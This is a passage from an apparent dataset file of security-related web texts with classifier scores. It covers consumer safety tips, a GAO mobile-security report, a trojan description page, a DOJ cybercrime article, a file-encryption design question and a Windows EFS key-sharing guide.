FBI or other law enforcement agency appears on the screen informing the user that unless he pays a “fine,” typically $200, his computer will remain locked, and he will be prosecuted for several felonies, including possessing child pornography. Similar requests for personal information that can be abused often arrive in instant messages or social networking postings. Another common e-mail scam is a post apparently from a friend or relative that claims they lost their wallet, checkbook, passport, return airline tickets and credit cards while visiting a foreign country, and are stranded unable to return home. This recognizable friend or relative then asks you to make him a loan and wire a large sum of money to him such that he can get home. The problem is that this is a complete fraud, and that friend or relative overseas is a name stolen from a hijacked e-mail account or address book! Also be aware of phone calls claiming to be from Microsoft (or a recognizable computer security company) telling you that your computer is infected with a virus, and that either for free or for a fee charged to your credit card, they will remotely access your computer and clean it for you, “So please give us remote access to your computer.” Not only will they not clean your computer of malware, but they will likely plant malware on your computer as well as access and steal all of your personal data and information. Third on Microsoft’s list of recommendations is to create strong passwords, and keep them secret. Passwords should be complex long phrases, consisting of upper case (capital) and lower case letters, along with numbers and symbols. These passwords should not be easy for other to guess like permutations of your name, address, phone number, kids names and birthdays; pets’ names; and other information that can be easily obtained through public or online resources. It is also necessary to utilize different passwords on different Web sites, such that if one Web site is compromised, it will not adversely impact your passwords and accounts on other Web sites. Microsoft emphasizes that it is especially important to use different complex passwords on Web sites that contain your financial information, such as banking, credit card and shopping Web sites. No. 4 from Microsoft is “Take charge of your online safety and reputation. Discover what is on the Internet about you and periodically evaluate what you find.” What others say about you online in social networking services, blogs and even eBay user ratings can adversely impact your online reputation. It is important to both maintain a positive online reputation and correct erroneous postings about you, but be careful not to fall into someone’s trap and disclose too much personal information. In its fifth security recommendation, Microsoft urges that users exercise care when using social networks such as Facebook and Twitter. All of the legitimate social networking services offer “settings” or “options” where users can set and manage their privacy and security settings. Users should control who can access their private information, what private information is available, and how others can search for your information. It might be appropriate to block other people from viewing your information. In addition to Microsoft’s suggestions, I would also add do not post information that you are out of town, on vacation or even at a movie or at dinner, as burglars and other crooks read Facebook and Twitter looking for empty homes to burglarize. Turn off the GPS in your digital camera or Smartphone before taking pictures that you want to post on a social networking site such as Facebook, or otherwise strip off the GPS information, as crooks and pedophiles have been known to use the GPS information encoded in digital photographs posted online to locate homes, cars, valuables and children for the purposes of victimization. An old cliché’ says, “Don’t do anything that you would not want your grandmother to read in the newspaper,” and that applies to social media postings as well. No. 6 from Microsoft says, “Take extra steps to help keep kids safer online.” Online safety and security must be a family effort, and incorporate some mix of guidance and monitoring. Microsoft suggests that “(parents) negotiate clear guidelines for Web and online game use that fit your kids’ maturity and your family’s values. Pay attention to what kids do and who they meet online.” Pedophiles and identity thieves troll chat rooms, social networking Web sites, blogs and other online resources looking for potential victims. Parents and children need to be cognizant of the risks, and educated in what to watch for that might indicate potential risks to children. Children must never disclose personal information to anyone, especially others who claim to be the same age and gender as the child (pedophiles often pretend to be a child in order to gain the confidence of the potential victim). Identity thieves try to gain the trust of children and trick them into disclosing private family information; residential burglars will do the same, asking the child about vacation or dinner plans: “We are going out for pizza and then a movie” tells a burglar that the house may be a good target. Children should never go to meet someone face to face that they met online, unless under the direct supervision and participation of a parent. There are a number of National Cyber Security Awareness Month events posted online (staysafeonline.org/ncsam/events), several of which will be streamed free over the Internet. There are also free materials available for parents, teachers, children and businesses that can be used in a variety of environments for educating others (staysafeonline.org/ncsam). While October is officially National Cyber Security Awareness Month, every month should be. Stop, think and connect properly, and stay safe online.",
        "prob": "tensor([[2.0335e-06, 1.0000e+00]])"
    },
    {
        "text": "- 12 iPhones Apps That Will Make You a Networking Star - 10 Careers Robots Are Taking From You - Big Data Gold Isn't Always Where You Would Expect It - 6 Tips to Build Your Social Media Strategy Network World - When it comes to security, most mobile devices are a target waiting to be attacked. That's pretty much the conclusion of a report to Congress on the status of the security of mobile devices this week by watchdogs at the Government Accountability Office. Combine the lack of security with the fact that mobile devices are being targeted by cybercriminals and you have a bad situation. For example, the number of variants of malicious software aimed at mobile devices has reportedly risen from about 14,000 to 40,000 or about 185% in less than a year, the GAO stated. \"Mobile devices face an array of threats that take advantage of numerous vulnerabilities commonly found in such devices. These vulnerabilities can be the result of inadequate technical controls, but they can also result from the poor security practices of consumers,\" the GAO stated. \"Private [companies] and relevant federal agencies have taken steps to improve the security of mobile devices, including making certain controls available for consumers to use if they wish and promulgating information about recommended mobile security practices. However, security controls are not always consistently implemented on mobile devices, and it is unclear whether consumers are aware of the importance of enabling security controls on their devices and adopting recommended practices.\" The GAO report came up with a list of mobile vulnerabilities it says are common to all mobile platforms and it offered a number of possible fixes for the weaknesses: From the report: • Mobile devices often do not have passwords enabled. Mobile devices often lack passwords to authenticate users and control access to data stored on the devices. Many devices have the technical capability to support passwords, personal identification numbers (PIN), or pattern screen locks for authentication. Some mobile devices also include a biometric reader to scan a fingerprint for authentication. However, anecdotal information indicates that consumers seldom employ these mechanisms. Additionally, if users do use a password or PIN they often choose passwords or PINs that can be easily determined or bypassed, such as 1234 or 0000. Without passwords or PINs to lock the device, there is increased risk that stolen or lost phones' information could be accessed by unauthorized users who could view sensitive information and misuse mobile devices. • Two-factor authentication is not always used when conducting sensitive transactions on mobile devices. According to studies, consumers generally use static passwords instead of two-factor authentication when conducting online sensitive transactions while using mobile devices. Using static passwords for authentication has security drawbacks: passwords can be guessed, forgotten, written down and stolen, or eavesdropped. Two-factor authentication generally provides a higher level of security than traditional passwords and PINs, and this higher level may be important for sensitive transactions. Two-factor refers to an authentication system in which users are required to authenticate using at least two different \"factors\" — something you know, something you have, or something you are — before being granted access. Mobile devices can be used as a second factor in some two-factor authentication schemes. The mobile device can generate pass codes, or the codes can be sent via a text message to the phone. Without two-factor authentication, increased risk exists that unauthorized users could gain access to sensitive information and misuse mobile devices. • Wireless transmissions are not always encrypted. Information such as e-mails sent by a mobile device is usually not encrypted while in transit. In addition, many applications do not encrypt the data they transmit and receive over the network, making it easy for the data to be intercepted. For example, if an application is transmitting data over an unencrypted WiFi network using http (rather than secure http), the data can be easily intercepted. When a wireless transmission is not encrypted, data can be easily intercepted. • Mobile devices may contain malware. Consumers may download applications that contain malware. Consumers download malware unknowingly because it can be disguised as a game, security patch, utility, or other useful application. It is difficult for users to tell the difference between a legitimate application and one containing malware. For example, an application could be repackaged with malware and a consumer could inadvertently download it onto a mobile device. the data can be easily intercepted. When a wireless transmission is not encrypted, data can be easily intercepted by eavesdroppers, who may gain unauthorized access to sensitive information. • Mobile devices often do not use security software. Many mobile devices do not come preinstalled with security software to protect against malicious applications, spyware, and malware-based attacks. Further, users do not always install security software, in part because mobile devices often do not come preloaded with such software. While such software may slow operations and affect battery life on some mobile devices, without it, the risk may be increased that an attacker could successfully distribute malware such as viruses, Trojans, spyware, and spam to lure users into revealing passwords or other confidential information. • Operating systems may be out-of-date. Security patches or fixes for mobile devices' operating systems are not always installed on mobile devices in a timely manner. It can take weeks to months before security updates are provided to consumers' devices. Depending on the nature of the vulnerability, the patching process may be complex and involve many parties. For example, Google develops updates to fix security vulnerabilities in the Android OS, but it is up to device manufacturers to produce a device-specific update incorporating the vulnerability fix, which can take time if there are proprietary modifications to the device's software. Once a manufacturer produces an update, it is up to each carrier to test it and transmit the updates to consumers' devices. However, carriers can be delayed in providing the updates because they need time to test whether they interfere with other aspects of the device or the software installed on it. In addition, mobile devices that are older than two years may not receive security updates because manufacturers may no longer support these devices. Many manufacturers stop supporting smartphones as soon as 12 to 18 months after their release. Such devices may face increased risk if manufacturers do not develop patches for newly discovered vulnerabilities. • Software on mobile devices may be out-of-date. Security patches for third-party applications are not always developed and released in a timely manner. In addition, mobile third-party applications, including web browsers, do not always notify consumers when updates are available. Unlike traditional web browsers, mobile browsers rarely get updates. Using outdated software increases the risk that an attacker may exploit vulnerabilities associated with these devices. • Mobile devices often do not limit Internet connections. Many mobile devices do not have firewalls to limit connections. When the device is connected to a wide area network it uses communications ports to connect with other devices and the Internet. A hacker could access the mobile device through a port that is not secured. A firewall secures these ports and allows the user to choose what connections he wants to allow into the mobile device. Without a firewall, the mobile device may be open to intrusion through an unsecured communications port, and an intruder may be able to obtain sensitive information on the device and misuse it. • Mobile devices may have unauthorized modifications. The process of modifying a mobile device to remove its limitations so consumers can add features (known as \"jailbreaking\" or \"rooting\") changes how security for the device is managed and could increase security risks. Jailbreaking allows users to gain access to the operating system of a device so as to permit the installation of unauthorized software functions and applications and/or to not be tied to a particular wireless carrier. While some users may jailbreak or root their mobile devices specifically to install security enhancements such as firewalls, others may simply be looking for a less expensive or easier way to install desirable applications. In the latter case, users face increased security risks, because they are bypassing the application vetting process established by the manufacturer and thus have less protection against inadvertently installing malware. Further, jailbroken devices may not receive notifications of security updates from the manufacturer and may require extra effort from the user to maintain up-to-date software. • Communication channels may be poorly secured. Having communication channels, such as Bluetooth communications, \"open\" or in \"discovery\" mode (which allows the device to be seen by other Bluetooth-enabled devices so that connections can be made) could allow an attacker to install malware through that connection, or surreptitiously activate a microphone or camera to eavesdrop on the user. In addition, using unsecured public wireless Internet networks or WiFi spots could allow an attacker to connect to the device and view sensitive information. The GAO report went on to state that connecting to an unsecured WiFi network could let an attacker access personal information from a device, putting users at risk for data and identity theft. One type of attack that exploits the WiFi network is known as man-in-the-middle, where an attacker inserts himself in the middle of the communication stream and steals information. So what can be done to secure mobile devices? The GAO report offers a number of ideas including: • Enable user authentication: Devices can be configured to require passwords or PINs to gain access. In addition, the password field can be masked to prevent it from being observed, and the devices can activate idle-time screen locking to prevent unauthorized access. • Enable two-factor authentication for sensitive transactions: Two-factor authentication can be used when conducting sensitive transactions on mobile devices. Two-factor authentication provides a higher level of security than traditional passwords. Two-factor refers to an authentication system in which users are required to authenticate using at least two different \"factors\" — something you know, something you have, or something you are — before being granted access. Mobile devices themselves can be used as a second factor in some two-factor authentication schemes used for remote access. The mobile device can generate pass codes, or the codes can be sent via a text message to the phone. Two-factor authentication may be important when sensitive transactions occur, such as for mobile banking or conducting financial transactions. • Verify the authenticity of downloaded applications: Procedures can be implemented for assessing the digital signatures of downloaded applications to ensure that they have not been tampered with. • Install antimalware capability: Antimalware protection can be installed to protect against malicious applications, viruses, spyware, infected secure digital cards,b and malware-based attacks. In addition, such capabilities can protect against unwanted (spam) voice messages, text messages, and e-mail attachments. • Install a firewall: A personal firewall can protect against unauthorized connections by intercepting both incoming and outgoing connection attempts and blocking or permitting them based on a list of rules. • Install security updates: Software updates can be automatically transferred from the manufacturer or carrier directly to a mobile device. Procedures can be implemented to ensure these updates are transmitted promptly. • Remotely disable lost or stolen devices: Remote disabling is a feature for lost or stolen devices that either locks the device or completely erases its contents remotely. Locked devices can be unlocked subsequently by the user if they are recovered. • Enable encryption for data stored on device or memory card: File encryption protects sensitive data stored on mobile devices and memory cards. Devices can have built-in encryption capabilities or use commercially available encryption tools. • Enable whitelisting: Whitelisting is a software control that permits only known safe applications to execute commands. • Establish a mobile device security policy: Security policies define the rules, principles, and practices that determine how an organization treats mobile devices, whether they are issued by the organization or owned by individuals. Policies should cover areas such as roles and responsibilities, infrastructure security, device security, and security assessments. By establishing policies that address these areas, agencies can create a framework for applying practices, tools, and training to help support the security of wireless networks. • Provide mobile device security training: Training employees in an organization's mobile security policies can help to ensure that mobile devices are configured, operated, and used in a secure and appropriate manner.",
        "prob": "tensor([[2.1183e-06, 1.0000e+00]])"
    },
    {
        "text": "Tool:Win32/Hideproc.C is a new version of an old Trojan that’s installed as one part of a larger infection for the purpose of concealing memory processes and other malicious components. Most Trojans like Tool:Win32/Hideproc.C will run without your permission as concealed memory processes and can be observed only indirectly through the side effects of their attacks. Since Tool:Win32/Hideproc.C may be part of a larger threat and even more malicious threat, you should immediately take action to delete Tool:Win32/Hideproc.C from your computer before serious damage occurs. The many Tools of Tool:Win32/Hideproc.C’s Malignant Trade Tool:Win32/Hideproc.C is just a 2010 version of the Hideproc Trojan that was first noted in 2007. Since that time, different versions of Hideproc have appeared, including Tool:Win32/Hideproc.C as well as Trojan:Win32/Hideproc.F and Trojan:Win32/Startpage.RM. Even if your security software can detect one of these threats, your PC may still be vulnerable to attacks by newer versions like Tool:Win32/Hideproc.C. Keeping your anti-malware programs completely updated is a vital step in protecting your PC from Tool:Win32/Hideproc.C. Avoiding initial infections can be done by keeping your browser up to date, disabling scripts from untrustworthy sources and avoiding suspicious files. Some versions of Hideproc are installed as specific pieces of a larger infection for the purpose of hiding this infection. Tool:Win32/Hideproc.C may conceal, not only Tool:Win32/Hideproc.C’s own memory processes, but also the memory processes of other malicious programs. When this is combined with a standard Trojan tactic of running automatically when Windows loads, this lets Tool:Win32/Hideproc.C and Tool:Win32/Hideproc.C’s cohorts hide in plain sight while still being active at all times. You can detect hidden memory processes by noting unusual system resource usage or by observing the other side effects of the attacks caused by Tool:Win32/Hideproc.C and similar Trojans. The Rest of what Tool:Win32/Hideproc.C Has in Store for Your Computer Tool:Win32/Hideproc.C or threats related to Tool:Win32/Hideproc.C may also cause other problems: - Tool:Win32/Hideproc.C may hijack your web browser. Hijacks can play advertisements, create fake errors that make it appear as though a benevolent website isn’t safe, change your homepage or redirect you to dangerous websites. - Tool:Win32/Hideproc.C may install a Remote Administration Tool or serve as a RAT by itself. RATs let remote criminals control your computer and are often the culprits behind Distributed-Denial-of-Service attacks and other illegal activities. - Tool:Win32/Hideproc.C may use keylogger functions or other spyware-related capabilities to record passwords and other information in a log that is later sent to a remote criminal. - Tool:Win32/Hideproc.C may block applications and even make it look like those applications are infected when they’re completely fine. - Tool:Win32/Hideproc.C may create Trojans that imitate Windows errors to try to fool you into performing self-destructive actions. These Trojans can even imitate specific Windows functions like the Security Essentials Alert. Tool:Win32/Hideproc.C Automatic Detection Tool (Recommended) Is your PC infected with Tool:Win32/Hideproc.C? To safely & quickly detect Tool:Win32/Hideproc.C, we highly recommend you run the malware scanner listed below. Download SpyHunter's* Malware Scanner to detect Tool:Win32/Hideproc.C What happens if Tool:Win32/Hideproc.C does not let you open SpyHunter or blocks the Internet? File System Modifications - The following files were created in the system: # File Name 1 1 Click PC Fix v3.5.exe 2 11878.dll 3 adsnt.exe 4 appconf32.exe 5 ashampkeygen.exe 6 audiosrv32.dll 7 ce3f3047-08bc-36dd-43e4-358cd4362a09.dll 8 chngu32.dll 9 chp.exe 10 cleaner7.exe 11 core32_175.dll 12 crack maxsea plaisance v10.11.12.exe 13 cryptnet32.dll 14 DCPPaid.exe 15 dispdrv.exe 16 DK.exe 17 dpcfinen.dll 18 Fl_3-8D-0fa-O4.dll 19 gamexl.exe 20 info.exe 21 ISd33_2298.exe 22 lpnedu.dll 23 MsMxEng.exe 24 NEBDFWc.dll 25 oyplemis.dll 26 PornoProtector.exe 27 questbrowse137.exe 28 ramcore.exe 29 sbluini.dll 30 service.exe 31 setup.exe 32 setup_lvk.exe 33 stlubchg.dll 34 SubsHelperBHO.dll 35 Svg64.exe 36 THE7SINS_RETAIL.EXE 37 uinex4.dll 38 updateuser.exe 39 userlib.exe 40 w2_0.exe 41 winntse.bin.exe 42 wrtchry.dll 43 Xtreme Stage Hack.dll 44 xvid_setup1.2.2-win32.exe 45 yaxuvu.dll Posted: April 18, 2011 | By SpywareRemove Threat Level: 8/10 Rate this article: Detection Count: 1,330",
        "prob": "tensor([[2.0545e-06, 1.0000e+00]])"
    },
    {
        "text": "Investigating and prosecuting cybercrimes are diverse and fluid fields. The dark-hearted members of the human race have found ways to exploit innovations for their own selfish means throughout time. Now, with the ever-growing global dependence on computer networks, criminals are finding new ways to disrupt lives in the real world through enterprise in the cyber one. The U.S. Department of Justice and its allies have adapted their methods and techniques over the past decade and continue to adjust to prevent the morphing illegal activities in cyberspace, whether the computer crime itself is the full intent or only part of a larger scheme. During the past 10 years, the Department of Justice (DOJ) has seen changes in intrusions and cybercases, from the crimes themselves to the types of criminals carrying out the illegal actions. Previously, most computer crimes were perpetrated by lone-wolf hackers acting independently, often for fame, publicity or the thrill. Today, cybercrime has become more organized, with financial gain serving as the main motive for most actions. Attacks often are aimed at financial institutions or designed for identity theft. And instead of some solitary computer geek giggling away as he hacks into networks from his basement, groups of people are now coming together, sometimes in tight organizations and sometimes in more loosely knit associations, to achieve a financial end. Though the DOJ has seen instances where organized crime uses the Internet to handle some of its activities, most of the online organizations the department battles lack a hierarchy. Instead, people use social networking tools such as instant messaging, forums and e-mail to connect and work together in groups. They buy themselves information so people in different countries or across one nation can work together to perpetrate a crime. This type of networking allows for greater specialization in a particular field. In the past, when cybercrime was conducted mainly by individuals, each criminal had to obtain all the pieces necessary to carry out the transgression. For example, someone aiming to commit financial fraud might need three pieces of information—a credit card number, a fake credit card and a fake identification—to steal money. Now, officials at the DOJ are dealing with more specialized criminals who band together and collaborate to benefit from one another’s individual areas of expertise. People skilled at stealing credit card numbers would sell that information to individuals who are experts at encoding fake credit cards. In 2004, the department made a major bust in this area, taking down a large operation known as Shadow Crew, which was basically a marketplace for selling identification information. One of the DOJ’s greatest challenges is the increasing organization of groups committing cybercrime as well as the increasing intersection of organized and hacking crime groups. International organized criminals are using computer networks to steal hundreds of millions of dollars from the In other efforts to address the problem of organized crime in cyberspace, the DOJ has prioritized and targeted these groups and has employed resources across the government to address the factions. The resources include collecting and synthesizing law enforcement and intelligence information on these targets. In addition, the department continues to expand cooperative cybercrime operations efforts with foreign law enforcement agencies. The Law Enforcement Strategy to Combat International Organized Crime announced by the U.S. Attorney General in April 2008 specifically addresses the threats these groups pose in cyberspace, including the ability of groups to wreak havoc in locations far from their physical geographies. In terms of cybercrime and cybersecurity, the cooperative strategy builds on years of foundational work by the DOJ in international organizations such as the G8, Interpol and the Council of Europe. “Our efforts in these groups involve both building the legal infrastructure so that criminals do not find safe havens in countries that do not have the laws to prosecute them, as well as building the operational infrastructure, ensuring that police and prosecutors are prepared to investigate and prosecute high-tech crime, and to cooperate with other countries in doing so,” Lynch explains. Operationally, prosecutors and law enforcement in the These crimes being perpetrated in cyberspace and the methods of carrying them out force the DOJ to adapt its techniques both in apprehending and prosecuting the guilty parties. “It creates challenges in both respects,” Lynch says. Actually identifying the people responsible for computer crimes is difficult and requires the use of many resources from the department’s law enforcement partners. Finding the perpetrators of computer crimes can be a two-fold effort. First, law enforcement officials have to locate the cyber identity of the guilty party. Once that is complete, they still have to dig beyond the nickname to attribute the activities to an actual person. To do this, officials follow both electronic and money trails, and they sometimes find the money trail to be more efficient to trace. Lynch explains that the DOJ and its partners must integrate the information they receive from the cyberside of an investigation with old-fashioned techniques such as forensic accounting and surveillance of people picking up money. Jurisdiction also is often an issue in cybercrimes. Because cyberspace covers all geographies, criminals working together might be in different parts of one country or different countries. Crimes cross state, district and other boundaries, and Lynch acknowledges that working with state and local law enforcement, international partners and other agencies to identify different people involved with a criminal effort and to prosecute them successfully can create challenges. For example, the first knowledge of an identity-theft ring might come from the New York Police Department when someone tries to pass a fake credit card. That individual may be linked to people in a foreign country or other parts of the While officials at the DOJ declined to comment on specific current or future cyberoperations, Lynch did explain that the department continues to evaluate the changing shape of criminal behavior. Any information discovered through those efforts will be rolled into the department’s future initiatives. He shares that officials always are looking at the threat and criminal landscape as well as working with their law enforcement partners to ensure appropriate reaction to threats. Other areas where the DOJ holds its cards close include specific technologies used in the detection and prosecution of criminals—these are open for discussion only when they come up in court—and research and development activities. Though the department does not comment directly on its research and development, it does work with partners across the public and private sector to ensure the acquisition of necessary capabilities. Beyond basic law enforcement technology, officials with the department must be aware of financial and banking systems operation, and they must share information they learn during investigations with the private sector so institutions can secure themselves better in the future. The DOJ works to ensure a healthy line of information among prosecutors, responders and the private sector. The agency strives to ensure it obtains threat and vulnerability information. That usually does not go directly to prosecutors, but to investigative agencies, underlining the need for robust information-sharing practices. Investigators and prosecutors have a number of methods available to them when trying to track down cybercrimes. Statutes and standards in place enable law enforcement officers to request search warrants from a court to obtain necessary information from contract service providers. Basic customer information also can be obtained with a subpoena. The DOJ continues to examine the tools for investigating crimes on the network to ensure they keep up with current technologies. Officials also continually examine the balance between privacy and law enforcement needs. Despite the pervasive nature of cybercrime, Lynch says it is only one of several high-priority fields in the DOJ. The highest priority is terrorism, and much of the department’s work deals with national security issues. In many cases, cyberoperations become a part of other operations. Lynch explains that his office has consulted with law enforcement agencies, and the criminal division works closely with the national security division to ensure that best efforts are applied to investigating terrorist operations. Lynch explains that cybercrime and cyberhacking are his focus area; however, information related to computer networks has effects across all types of criminal activities. The Child Protection and Obscenity Section of the DOJ, for example, has a large cyberfocus to address child pornography that is being traded online. Across the criminal landscape, perpetrators use computers to commit crimes, so Lynch’s division provides advice and assistance to help equip its partners with the information they need to investigate those misdeeds. Terrorism prosecutors in the National Security Division, for instance, need knowledge of computer operations and how to store information on computer systems legitimately to identify how groups are communicating using computer technologies. Lynch shares that the military and intelligence communities focus on the cyberterrorism threat in partnership with the DOJ. State-sponsored computer crimes often come to the department as a law enforcement issue. When officials first see an intrusion into a network, they have to determine if the intruder is an individual criminal, a member of an organized crime group or someone working to disrupt national security. The DOJ works with the intelligence community and the FBI to ensure that information about the threat is appropriately shared and handed off to the right people at the right time in the process. Lynch says that quantifying personal risk versus institutional risk is difficult. If investigators find someone’s personal information is being used for financial theft, they might not know immediately how criminals obtained that information. It could have been stolen when a person voluntarily offered the information in response to a phishing e-mail. Or, the information could have been collected through malicious software that records keystrokes on a computer system. Additionally, information could have been stolen from a bank, retailer or public database. As cybercrime and cyberoperations continue to advance and change, the law has to adjust as well. Several recommendations for changes to the U.S. Code for computer crime were enacted by Congress in August 2008. Updates to the computer crime statute have occurred several times over the last decade to ensure criminality is covered adequately. Lynch explains that when looking at appropriate statutory approaches, the DOJ tries to avoid language that is too specific about technologies and methods so the statute can be used to prosecute new forms of criminality as they emerge. Language should remain neutral when describing crimes and how they are carried out, because otherwise when a new technology comes along, changes must be made to the laws and regulations. The legislative process often moves more slowly than the criminals who are developing means for exploiting the system. To counter this effect, authors try to keep the legislative language as broad as possible to ensure officials can prosecute crimes. Lynch explains that much of what occurs is simply new ways of committing the same crime and that the department wants to ensure the public understands that is illegal. Department of Justice Computer Crime and Intellectual Property Section: www.usdoj.gov/criminal/cybercrime/index.html Federal Bureau of Investigation Cyber Investigations: www.fbi.gov/cyberinvest/cyberhome.htm Law Enforcement Strategy to Combat International Organized Crime: www.usdoj.gov/ag/speeches/2008/ioc-strategy-public-overview.pdf",
        "prob": "tensor([[2.0873e-06, 1.0000e+00]])"
    },
    {
        "text": "I am working on application that allows users to upload files containing company data and then share those files with a list of other users that have specific roles within the system. I want to encrypt the uploaded files to protect the data at rest while allowing the files to be shared by people who do not know the encryption password. The uploaded files are owned by the company that they belong too not by the user who uploads them. - When a user creates an account on the system a private-public key pair is generated for the user, the private key is stored in the database and is encrypted with the users clear text password, which is accessible during the login process. User passwords are salted, , stretched hashes so other than during login the app does not know the clear text of the users password. - When a user log's into the system successfully the encrypted user's private key is pulled from the database, decrypted and the private decrypted key is stored in the http session. I am assuming that while the decrypted private key is in RAM it going to be very hard but not impossible for a hacker to get a private key out of the RAM of a running process. - When a user uploads a file the following happens: - A secure random UUID is generated and used as the password to encrypt the uploaded file using AES 256 - The generated UUID is then encrypted with the user's public key and stored in the database. - The system determines a list of every user that can access that file - For every user that can access the uploaded file the generated UUID is encrypted with that user's public key and the encrypted UUID is stored in the database. - When a file is being downloaded here is what the system does. - It locates the encrypted password for the file being downloaded - Decrypt the encrypted password using the user's private key - decrypt the file using the file password - return the clear text of the file to the user To me this seems to be more secure than just storing the files on the server unecrypted a hacker who steals a copy of the data would not be able to read the files, since they would have to figure out the clear text passwords of the users before they could get at the user's private key. The problem is dealing with password rests, since the users private key is encrypted with the users password if the user forgets their password and does a password reset they would loose their private key and thus access to the files they uploaded. Since I need to have a password rest feature in the application I am into a chicken and egg scenarios because how do I safely store the private keys of the users without end result being less secure than doing nothing? Is there any way to store private keys that are encrypted with a users clear text password and still have a way when resetting a password to preserve access to the users data? I am not a security expert and would prefer to use a known solution / library for this problem but I can't seem to find any so I have to make my own solution.",
        "prob": "tensor([[2.1717e-06, 1.0000e+00]])"
    },
    {
        "text": "The Washington Post • Don't share passwords with anyone. Avoid using common words, phrases, or personal information. Update regularly. • Keep your operating system, browser, anti-virus and other critical software up to date. Security updates and patches are available free from major companies. • Verify the authenticity of requests from companies or individuals by contacting them directly. If you are being asked to provide personal information via email, you can independently contact the company directly to verify this request. • Pay close attention to the URLs of websites you visit. Malicious websites sometimes use a variation in common spelling or a different domain (for example, .com instead of .net) to deceive unsuspecting computer users. • Major data thefts can happen when attackers gain wireless access to an organization from a conference room or parking lot. Run wireless scanning detection to see unauthorized uses. • Restrict access and secure the personal information of employees and customers to prevent identity theft. • Run \"penetration testing\" on your own system to expose vulnerabilities. • Maintain a functional backup system. • Update software with constantly upgraded security. • Turn off the option to automatically download attachments. • Save and scan any attachments before opening them. If you have to open an attachment before you can verify the source, take the steps listed below. • Run anti-virus scans frequently. Social media, videogames, chat sites • Limit the amount of personal information you post, such as your address. Watch what friends post about you to make sure you are comfortable sharing that information with strangers. • Use privacy and security settings that limit the information you share online. • Be wary of strangers and the huge amount of false information online. • Only access the Internet over a secure network. Maintain the same vigilance on your mobile device that you would on your computer. • Be suspicious of unknown links or requests sent through text message. Do not click on unknown links or answer strange questions sent to your mobile device, regardless of who the sender appears to be. • Download only trusted applications from reputable sources or marketplaces. • Talk to your children about Internet safety. Keep your family's computer in an open area and talk to your children about what they are doing online, including who they're talking to and what websites they're visiting. • Inform children of of online risks so that they are able to recognize suspicious activity and safeguard their personal information. SOURCE: Department of Homeland Security, SANs, CSIS",
        "prob": "tensor([[2.0794e-06, 1.0000e+00]])"
    },
    {
        "text": "People who use laptops often carry around several gigabytes of information—some trivial and some confidential. Most users depend on their username and password combination to restrict access to this information, but administrators know that this protection is only minimal. The obvious solution to protect data is to encrypt it. Companies such as Sunbelt Software and PC Guardian offer specialized encryption tools, and Windows 2000's Encrypting File System (EFS) offers built-in encryption. But a problem with EFS—compared with other encryption solutions—is that because EFS uses unique private keys, people who share a laptop or workspace can't share the encrypted data. When just one person uses a laptop, this restriction isn't a problem. But I recently worked with a company that needed to protect corporate data on laptops that rotated on a regular basis. The laptops had several data directories that contained confidential customer data. When an employee—let's say Bob—had to do field work, he updated the data and took the laptop with him. If the company used EFS as Microsoft intended, the next employee to use the laptop—Mary, for example—would need to wipe all the data from the disk, then recopy all the data to the laptop to ensure that the network files were encrypted with her key. The company didn't want this hassle. In addition, when a laptop with only one designated user changed ownership, the company didn't want to have to decrypt, then later reencrypt, data on the laptop with the new user's key to ensure that the user could access the information. To meet the company's needs, I had to bend the EFS rules a bit. EFS uses an X.509 certificate to encrypt data. This certificate resides in a user's personal certificate store. When the user has no suitable key, EFS will try to request the key from an enterprise Certificate Authority (CA). If no enterprise CA exists, the workstation will create a self-signed certificate. To share encrypted data, users must have the same key. But the problem is that certificates created in this manner are unique for each user. Simply sharing a key isn't difficult. You can use any key pair for which you've marked the private key exportable—including the self-signed certificates EFS can create. However, I wanted to use certificates that a company CA had issued so that the certificates would conform to the company's certificate policy. The company had a standalone root CA in place. (You can also use an enterprise root CA. With an enterprise root CA, you don't need to manually request a certificate, then have an administrator issue the certificate.) For information about installing a standalone root CA, see the Windows Help files. To use a standalone root CA to create an EFS certificate, log on as Administrator and go to the Certificate Services Web site (http://servername/certsrv, where servername is the name of the server on which you installed your CA). This Web site installs automatically when you install Certificate Services. Select Request a certificate. Because the certificate enrollment form doesn't have a default option to request an EFS encryption key, you need to use the advanced request form. In the advanced request form, enter all the requested information. In the name field, enter a name that will help you easily identify the certificate later. Be sure to correctly enter the Object Identifier (OID)—in this case, 126.96.36.199.4.1.3188.8.131.52—and select the option to mark the key as exportable. For a list of OIDs, see the Microsoft article \"Object IDs Associated with Microsoft Cryptography\" (http://support.microsoft.com/?kbid=287547). Finally, select a key size that matches the encryption strength you want. Next, you must use the Microsoft Management Console (MMC) Certification Authority snap-in to approve the key request. In the snap-in tree, expand your standalone CA's folder, then open the Pending Requests folder. This folder contains all the certificates that have been requested through the Certificate Services Web site but aren't yet approved. On a standalone root CA, each requested certificate must be approved before it's issued. Right-click the certificate you requested, and select All tasks, Issue. Next, go to the Certificate Services Web site and select Check on a pending Certificate. Select your certificate. On the next screen, click Install this certificate. You can now use the key to encrypt files. To make the key available to other users, load the MMC Certificates snap-in and select the option for the snap-in to manage My user Account. Expand the Certificates Current User folder and select the Personal folder. The Personal folder is the user's personal certificate store. Right-click the appropriate encryption key (which you can identify by the name you entered on the request form) and export the key as a .pfx file (thus including the private key). Multiple users (e.g., Bob and Mary) can now double-click the .pfx file in Windows Explorer to import the file and therefore create encrypted files and access each other's encrypted files. When a user imports the .pfx file into his personal certificate store, the user needs to mark the file as nonexportable, which is the default. Only use this certificate on domain accounts. A thief could easily circumvent your local user account security: If he or she obtained your machine, he or she could use the private key in your personal store to decrypt your data. Make sure you store the .pfx file in a secure place. By default, the EFS recovery agent role goes to the local administrator. However, you need to assign this role to a domain user (whom I'll call EFSrecoveryUser). Otherwise, a thief could log on as the local administrator to decrypt your data. To create an EFS recovery agent, log on as EFSrecoveryUser and go to the Certificate Services Web site. Follow the same procedure as for the EFS certificate request, except you need to use OID 184.108.40.206.4.1.3220.127.116.11.1 to enroll an EFS recovery certificate. Again, enter a name that will help you easily identify the EFS recovery certificate. To assign the EFS recovery agent to all the machines by using Active Directory (AD), you must export the EFS Recovery public key from EFSrecoveryUser's personal certificate store as a Distinguished Encoding Rules (DER) Encoded Binary X.509 file or a Base64 Encoded X.509 (.cer) file, then use a policy to publish the file. Log on as EFSrecoveryUser and open the Certificates snap-in. Open the Personal folder and right-click the appropriate key (which you can identify by the name you entered on the certificate request form) in the Details pane. Select All Tasks, Export, and select the export format and filename. To publish the public key, open the MMC Active Directory Users and Computers snap-in. Right-click the container where you store your computer accounts. This container is usually the Computers container directly under the root level—but since you can't assign policies to this container, you need to create an alternative container for computer accounts and move the accounts there. Select Properties and 